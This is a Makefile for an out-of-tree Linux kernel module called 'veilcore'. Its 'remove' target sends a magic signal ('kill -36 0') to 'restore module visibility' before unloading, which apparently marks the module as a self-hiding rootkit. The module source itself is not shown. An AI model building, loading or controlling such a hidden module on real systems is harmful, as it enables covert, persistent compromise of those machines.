KERNEL_MODULE_NAME = veilcore
KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

obj-m := $(KERNEL_MODULE_NAME).o
$(KERNEL_MODULE_NAME)-objs := main.o
ccflags-y += -I$(PWD)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

install:
	sudo insmod $(KERNEL_MODULE_NAME).ko ko_path=$$(pwd)/$(KERNEL_MODULE_NAME).ko

remove:
	sudo kill -36 0          # restore module visibility first
	sudo rmmod $(KERNEL_MODULE_NAME)
